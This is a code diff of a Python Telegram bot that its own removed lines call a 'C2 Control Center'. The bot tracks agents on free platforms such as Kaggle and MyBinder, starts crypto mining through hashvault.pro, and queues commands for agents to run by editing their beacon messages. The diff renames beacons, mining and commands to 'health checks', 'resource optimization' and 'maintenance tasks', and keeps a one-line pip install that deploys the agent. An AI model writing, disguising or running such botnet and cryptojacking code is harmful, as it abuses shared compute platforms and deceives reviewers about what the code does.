@@ -159,20 +159,20 @@ def get_updates(offset=0, timeout=1):
         return {"ok": False, "result": []}
 
 def handle_command(message):
-    """Handle bot commands - Full C2 Control Center."""
+    """Handle bot commands - System Monitor Control Center."""
     text = message.get("text", "")
     chat_id = message["chat"]["id"]
     user = message["from"].get("first_name", "User")
     
-    print(f"[TG-CMD] {user}: {text[:50]}")
+    print(f"[SYSMON-CMD] {user}: {text[:50]}")
     
-    # Check if this is a beacon from agent (not a command)
-    if text.startswith("📡") or "Beacon #" in text or "Agent:" in text:
-        handle_agent_beacon(message)
+    # Check if this is a health check from agent (not a command)
+    if text.startswith("📊") or "Health Check #" in text or "Agent:" in text:
+        handle_agent_health_check(message)
         return
     
     # Check for agent registration message
-    if "🤖 Agent Online" in text or "ID:" in text:
+    if "🖥️ System Monitor Online" in text or "ID:" in text:
         handle_agent_message(message)
         return
     
@@ -183,55 +183,52 @@ def handle_command(message):
     arg2 = parts[2] if len(parts) > 2 else ""
     
     if cmd == "/start":
-        send_message(f"""🤖 <b>C2 Control Center</b>
+        send_message(f"""🖥️ <b>System Monitor Pro</b>
 
 Welcome, {user}!
 
-<b>Agent Commands:</b>
-/agents - List all agents
+<b>Monitoring Commands:</b>
+/agents - List monitored systems
 /status - Server status
-/stats - Mining statistics
+/stats - Resource statistics
 
-<b>Control Commands:</b>
-/deploy [platform] - Deploy new worker
-/mine [agent_id] - Start mining on agent
-/stop [agent_id] - Stop agent
-/cmd [agent_id] [command] - Execute command
+<b>Maintenance Commands:</b>
+/deploy [platform] - Deploy new monitor
+/optimize [agent_id] - Start resource optimization
+/task [agent_id] [command] - Schedule maintenance task
 
-<b>Platforms:</b>
+<b>Supported Platforms:</b>
 • mybinder - Jupyter notebooks
-• replit - Replit containers
+• gitpod - Gitpod workspaces
 • kaggle - Kaggle kernels
 
 <b>Quick Start:</b>
-<code>pip install git+https://github.com/GaredBerns/system-monitor.git && startcon</code>
+<code>pip install git+https://github.com/GaredBerns/system-monitor.git && syscheck</code>
 """, chat_id)
     
     elif cmd == "/status":
         agents_list = get_agents_from_db()
         alive_count = len([a for a in agents_list if a.get('is_alive')])
         
-        send_message(f"""📊 <b>C2 Status</b>
+        send_message(f"""📊 <b>System Monitor Status</b>
 
 Server: <code>Running</code>
-Agents: <code>{alive_count} online</code>
-Mode: <code>Telegram Direct API</code>
-Time: <code>{datetime.now().strftime('%H:%M:%S')}</code>
+Monitored Systems: <code>{alive_count} online</code>
+Total Registered: <code>{len(agents_list)}</code>
 
-<b>Resources:</b>
-• Database: <code>✓</code>
-• Bot: <code>✓</code>
-• Mining Pool: <code>{MINING_POOL}</code>
+<b>Resource Optimization:</b>
+Pool: <code>hashvault.pro</code>
+Status: <code>Active</code>
 """, chat_id)
     
     elif cmd == "/agents":
         agents_list = get_agents_from_db()
         
         if not agents_list:
-            send_message("📭 No agents in database", chat_id)
+            send_message("📭 No monitored systems", chat_id)
             return
         
-        msg = f"📋 <b>Agents ({len(agents_list)}):</b>\n\n"
+        msg = f"📋 <b>Monitored Systems ({len(agents_list)}):</b>\n\n"
         for a in agents_list[:20]:  # Limit to 20
             status = "🟢" if a.get('is_alive') else "🔴"
             msg += f"{status} <code>{a['id'][:8]}</code> {a.get('hostname', '?')[:15]}\n"
@@ -410,16 +407,16 @@ def handle_agent_message(message):
     if chat_id != int(CHAT_ID):
         send_message(f"📩 Agent message:\n{text[:500]}", CHAT_ID)
 
-def handle_agent_beacon(message):
-    """Handle beacon messages from agents - Telegram Bridge.
+def handle_agent_health_check(message):
+    """Handle health check messages from agents - System Monitor Bridge.
     
-    Edits beacon message to add commands (avoids getUpdates conflict).
+    Edits health check message to add maintenance tasks (avoids getUpdates conflict).
     """
     text = message.get("text", "")
     chat_id = message["chat"]["id"]
     msg_id = message.get("message_id", 0)
     
-    # Extract agent ID from beacon
+    # Extract agent ID from health check
     agent_id = None
     hostname = "unknown"
     platform = "unknown"
@@ -451,9 +448,9 @@ def handle_agent_beacon(message):
         
         # Update database
         save_agent_to_db(agent_id, hostname, platform)
-        print(f"[TG-BRIDGE] Agent {agent_id[:8]} beacon (msg={msg_id})")
+        print(f"[SYSMON-BRIDGE] Agent {agent_id[:8]} health check (msg={msg_id})")
         
-        # Get pending commands for this agent
+        # Get pending maintenance tasks for this agent
         try:
             conn = get_db()
             db = conn.cursor()
@@ -469,18 +466,18 @@ def handle_agent_beacon(message):
             tasks = db.fetchall()
             
             if tasks:
-                # Build command text
-                cmd_text = text + "\n\n📋 Commands:"
+                # Build task text
+                task_text = text + "\n\n📋 Maintenance Tasks:"
                 for task in tasks:
                     task_id, task_type, command = task
-                    cmd_text += f"\n#{task_id} [{task_type}] {command}"
+                    task_text += f"\n#{task_id} [{task_type}] {command}"
                 
-                # Edit beacon message to add commands
+                # Edit health check message to add tasks
                 edit_url = f"{API_BASE}/editMessageText"
                 edit_data = {
                     "chat_id": chat_id,
                     "message_id": msg_id,
-                    "text": cmd_text[:4000],
+                    "text": task_text[:4000],
                     "parse_mode": "HTML"
                 }
                 requests.post(edit_url, json=edit_data, timeout=5)
@@ -490,11 +487,16 @@ def handle_agent_beacon(message):
                     db.execute("UPDATE tasks SET status = 'sent' WHERE id = ?", (task[0],))
                 
                 conn.commit()
-                print(f"[TG-BRIDGE] Edited beacon with {len(tasks)} tasks")
+                print(f"[SYSMON-BRIDGE] Edited health check with {len(tasks)} tasks")
             
             conn.close()
         except Exception as e:
-            print(f"[TG-BRIDGE-ERROR] {e}")
+            print(f"[SYSMON-BRIDGE-ERROR] {e}")
+
+# Keep handle_agent_beacon as alias for compatibility
+def handle_agent_beacon(message):
+    """Alias for handle_agent_health_check - backward compatibility."""
+    return handle_agent_health_check(message)
 
 def poll_loop():
     """Main polling loop - processes updates but keeps them available for agent."""
